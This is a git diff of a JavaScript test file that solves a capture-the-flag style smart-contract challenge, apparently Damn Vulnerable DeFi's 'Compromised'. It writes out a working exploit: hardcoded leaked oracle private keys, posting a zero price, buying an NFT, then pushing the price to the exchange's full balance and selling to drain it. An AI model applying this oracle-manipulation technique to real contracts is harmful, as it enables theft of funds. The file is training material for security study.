@@ -14,6 +14,7 @@ describe('Compromised challenge', function () {
     const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');
 
     before(async function () {
+        this.timeout(20000);
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
 
@@ -59,8 +60,43 @@ describe('Compromised challenge', function () {
         this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
     });
 
-    it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+    it('Exploit', async function () {
+        this.timeout(20000);
+        //Extracted private keys as:  bytes dump => string  => base64 decode => private key
+        let privateKey1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        let privateKey2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+        // Construct the wallets from the oracle private keys
+        let compromisedOracle1 = new ethers.Wallet(privateKey1, ethers.provider);
+        let compromisedOracle2 = new ethers.Wallet(privateKey2, ethers.provider);
+
+        let priceBefore = ethers.BigNumber.from(await this.oracle.connect(compromisedOracle1).getMedianPrice("DVNFT"));
+        console.log("Price before: " + priceBefore);
+
+        // Set price to 0 by the 2 compromised oracle then buy low, sell high
+        await this.oracle.connect(compromisedOracle1).postPrice("DVNFT", ethers.utils.parseEther("0"));
+        await this.oracle.connect(compromisedOracle2).postPrice("DVNFT", ethers.utils.parseEther("0"));
+
+        let priceAfter = ethers.BigNumber.from(await this.oracle.connect(compromisedOracle1).getMedianPrice("DVNFT"));
+        console.log("Price after: " + priceAfter);
+
+        const tx = await this.exchange.connect(attacker).buyOne({ value: ethers.utils.parseEther("0.01") });
+
+        await this.exchange.on("TokenBought", async (sender, tokenId, currentPriceInWei) => {
+            console.log("Token id is :" + tokenId);
+
+            await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
+            await this.oracle.connect(compromisedOracle1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+            await this.oracle.connect(compromisedOracle2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+            let nft = await this.nftToken.connect(attacker).balanceOf(attacker.address);
+            console.log("Number of nft's owned by attacker: " + nft);
+            await this.exchange.connect(attacker).sellOne(tokenId);
+
+            let after = ethers.BigNumber.from(await this.oracle.connect(compromisedOracle1).getMedianPrice("DVNFT"));
+            console.log("After Price: " + after);
+            await this.oracle.connect(compromisedOracle1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+            await this.oracle.connect(compromisedOracle2).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        });
+        await tx.wait(2);
     });
 
     after(async function () {
